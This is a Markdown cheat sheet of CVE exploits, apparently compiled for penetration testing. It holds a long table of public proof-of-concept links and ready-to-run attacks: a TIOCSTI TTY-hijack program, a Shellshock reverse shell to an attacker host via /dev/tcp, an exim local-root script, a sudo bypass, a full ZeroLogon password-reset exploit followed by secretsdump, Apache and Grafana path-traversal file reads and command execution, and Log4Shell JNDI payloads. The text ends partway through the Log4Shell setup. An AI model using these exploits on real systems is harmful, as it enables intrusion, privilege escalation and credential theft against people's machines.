# CVE

- [Exploit Databases](#exploit-databases)
- [Resources](#resources)

## Table of Contents

- [CVE-2005-4890: TTY Hijacking / TTY Input Pushback via TIOCSTI](#cve-2005-4890-tty-hijacking--tty-input-pushback-via-tiocsti)
- [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
- [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
- [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
- [CVE-2020-1472: ZeroLogon LPE](#cve-2020-1472-zerologon-lpe)
- [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
- [CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)](#cve-2021-41773-cve-2021-42013-cve-2020-17519-simples-apache-path-traversal-0-day)
- [CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read (0-day)](#cve-2021-43798-grafana-directory-traversal-and-arbitrary-file-read-0-day)
- [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
- [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
- [CVE-2022-1040: Sophos XG Firewall Authentication Bypass RCE](#cve-2022-1040-sophos-xg-authentication-bypass-rce)
- [CVE-2022-21675: Zip Slip](#cve-2022-21675-zip-slip)
- [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
- [CVE-2022-24439: GitPython RCE](#cve-2022-24439-gitpython-rce)
- [CVE-2022-30190: MS-MSDT Follina RCE](#cve-2022-30190-ms-msdt-follina-rce)
- [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
- [CVE-2022-44268: ImageMagick Arbitrary File Read PoC](#cve-2022-44268-imagemagick-arbitrary-file-read-poc)
- [CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability](#cve-2023-0126-sonicwall-sma1000-pre-authentication-path-traversal-vulnerability)
- [CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)](#cve-2023-21716-microsoft-word-rtf-font-table-heap-corruption-rce-poc-python-implementation)
- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
- [CVE-2023-22515: Confluence Server and Confluence Data Center Broken Access Control (0-day)](#cve-2023-22515-confluence-server-and-confluence-data-center-broken-access-control-0-day)
- [CVE-2023-22809: Sudo Bypass LPE](#cve-2023-22809-sudo-bypass-lpe)
- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)](#cve-2023-23397-microsoft-outlook-click-to-run-lpe-0-day-powershell-implementation)
- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
- [CVE-2023-38146: ThemeBleed RCE](#cve-2023-38146-themebleed-rce)
- [CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE](#cve-2023-46604-apache-activemq-openwire-transport-rce)
- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
- [CVE-2024-20656: Visual Studio VSStandardCollectorService150 Service LPE](#cve-2024-20656-visual-studio-vsstandardcollectorservice150-service-lpe)
- [CVE-2024-21378: Microsoft Outlook RCE](#cve-2024-21378-microsoft-outlook-rce)
- [CVE-2024-21626: Leaky Vessels Container Escape](#cve-2024-21626-leaky-vessels-container-escape)
- [CVE-2024-23897: Jenkins Arbitrary File Read](#cve-2024-23897-jenkins-arbitrary-file-read)
- [CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)](#cve-2024-24919-check-point-security-gateway-information-disclosure-0-day)
- [CVE-2024-32002: Git: git clone RCE](#cve-2024-32002-git-git-clone-rce)
- [GodPotato LPE](#godpotato-lpe)
- [Juicy Potato LPE](#juicy-potato-lpe)
- [JuicyPotatoNG LPE](#juicypotatong-lpe)
- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
- [PrintSpoofer LPE](#printspoofer-lpe)
- [RemotePotato0 LPE](#remotepotato0-lpe)
- [SharpEfsPotato LPE](#sharpefspotato-lpe)
- [Shocker Container Escape](#shocker-container-escape)
- [ThinkPHP < 6.0.14 Remote Code Execution RCE](#thinkphp--6014-remote-code-execution-rce)

## Exploit Databases

| Database | URL |
| --- | --- |
| Exploit Database | https://www.exploit-db.com |
| Sploitus | https://sploitus.com |
| Packet Storm | https://packetstormsecurity.com |
| 0day.today Exploit Database | https://0day.today |

## Resources

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon LPE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon LPE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon LPE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon LPE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-40444 | MSHTML builders RCE | https://github.com/aslitsecurity/CVE-2021-40444_builders |
| CVE-2021-40444 | MSHTML Exploit RCE | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
| CVE-2021-40444 | MSHTML RCE PoC | https://github.com/lockedbyte/CVE-2021-40444 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation LPE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation LPE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/n3rada/DirtyPipe |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-30190 | MS-MSDT Follina Attack Vector RCE | https://github.com/JohnHammond/msdt-follina |
| CVE-2022-30190 | MS-MSDT Follina RCE PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
| CVE-2022-30190 | MS-MSDT Follina RCE (Python Implementation) | https://github.com/chvancooten/follina.py |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-20598 | PDFWKRNL Kernel Driver LPE | https://github.com/H4rk3nz0/CVE-2023-20598-PDFWKRNL |
| CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22518 | Atlassian Confluence Server Improper Authorization RCE | https://github.com/sanjai-AK47/CVE-2023-22518 |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28252 | Windows Common Log File System Driver LPE | https://github.com/fortra/CVE-2023-28252 |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-29357 | Microsoft SharePoint Server LPE | https://github.com/Chocapikk/CVE-2023-29357 |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-38146 | ThemeBleed RCE | https://github.com/gabe-k/themebleed |
| CVE-2023-38831 | WinRAR Exploit (0-day) | https://github.com/b1tg/CVE-2023-38831-winrar-exploit |
| CVE-2023-43641 | GNOME libcue RCE | https://github.com/github/securitylab/tree/0a8ede65e0ac860d195868b093d3ddcbd00e6997/SecurityExploits/libcue/track_set_index_CVE-2023-43641 |
| CVE-2023-46604 | Apache ActiveMQ OpenWire Transport RCE | https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ |
| CVE-2023-4911 | Looney Tunables LPE | https://github.com/RickdeJager/CVE-2023-4911 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
| CVE-2024-6387 | OpenSSH regreSSHion RCE (1) | https://github.com/zgzhang/cve-2024-6387-poc |
| CVE-2024-6387 | OpenSSH regreSSHion RCE PoC (2) | https://github.com/xonoxitron/regreSSHion |
| CVE-2024-6387 | OpenSSH regreSSHion RCE PoC (3) | https://github.com/l0n3m4n/CVE-2024-6387 |
| CVE-2024-20656 | Visual Studio VSStandardCollectorService150 Service LPE | https://github.com/Wh04m1001/CVE-2024-20656 |
| CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (1) | https://github.com/duy-31/CVE-2024-21413 |
| CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (2) | https://github.com/CMNatic/CVE-2024-21413 |
| CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (3) | https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability |
| CVE-2024-21626 | Leaky Vessels Container Escape (1) | https://github.com/Wall1e/CVE-2024-21626-POC |
| CVE-2024-21626 | Leaky Vessels Container Escape (2) | https://github.com/NitroCao/CVE-2024-21626 |
| CVE-2024-28897 | Jenkins Arbitrary File Read | https://github.com/CKevens/CVE-2024-23897 |
| CVE-2024-29849 | Veeam Backup Enterprise Manager Authentication Bypass | https://github.com/sinsinology/CVE-2024-29849 |
| CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
| CVE-2024-32002 | Git: git clone RCE | https://github.com/amalmurali47/git_rce |
| CVE-2024-38077 | MadLicense Preauth RCE PoC (1) | https://github.com/CloudCrowSec001/CVE-2024-38077-POC |
| CVE-2024-38077 | MadLicense Preauth RCE PoC (2) | https://github.com/qi4L/CVE-2024-38077 |
| CVE-2024-38100 | Leaked Wallpaper LPE | https://github.com/MzHmO/LeakedWallpaper |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | GSM Linux Kernel LPE (1) | https://github.com/jmpe4x/GSM_Linux_Kernel_LPE_Nday_Exploit |
| n/a | GSM Linux Kernel LPE (2) | https://github.com/YuriiCrimson/ExploitGSM |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 LPE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare LPE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

## CVE-2005-4890: TTY Hijacking / TTY Input Pushback via TIOCSTI

> https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking

```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\ncp /bin/bash /tmp/bash; chmod u+s /tmp/bash\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
```

```c
$ gcc <FILE>.c -static
```

## CVE-2014-6271: Shellshock RCE PoC

```c
$ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
```

## CVE-2016-1531: exim LPE

- exim version <= 4.84-3

```c
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

## CVE-2019-14287: Sudo Bypass

> https://www.exploit-db.com/exploits/47502

### Prerequisites

- Sudo version < 1.8.28

### Exploitation

```c
!root:
$ sudo -u#-1 /bin/bash
```

## CVE-2020-1472: ZeroLogon LPE

> https://github.com/SecuraBV/CVE-2020-1472

> https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py

### Prerequisites

```c
$ python3 -m pip install virtualenv
$ python3 -m virtualenv venv
$ source venv/bin/activate
$ pip install git+https://github.com/SecureAuthCorp/impacket
```

### PoC Modification

```c
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```

### Weaponized PoC

```c
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

### Execution

```c
$ python3 zerologon_tester.py <HANDLE> <RHOST>
$ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
```

## CVE-2021-3156: Sudo / sudoedit LPE

> https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435

### Prerequisistes

- Ubuntu 20.04 (Sudo 1.8.31)
- Debian 10 (Sudo 1.8.27)
- Fedora 33 (Sudo 1.9.2)
- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1

### Vulnerability Test

```c
$ sudoedit -s /
```

The machine is vulnerable if one of the following message is shown.

```c
sudoedit: /: not a regular file
segfault
```

Not vulnerable if the error message starts with `usage:`.

## CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)

```c
$ curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

```c
$ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```

## CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read (0-day)

> https://vulncheck.com/blog/grafana-cve-2021-43798

### Prerequisistes

- Grafana 8.0.0-beta1 > 8.3.0

### Execution

```c
$ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../etc/passwd' --path-as-is
$ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
```

## CVE-2021-44228: Log4Shell RCE (0-day)

### Testing

```c
$ cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
```

### Prerequisistes

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

File: jdk-8u181-linux-x64.tar.gz

### Creating Library Folder

```c
$ sudo mkdir /usr/lib/jvm
$ cd /usr/lib/jvm
$ sudo tar xzvf /usr/lib/jvm/jdk-8u181-linux-x64.tar.gz
$ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
$ sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
$ sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
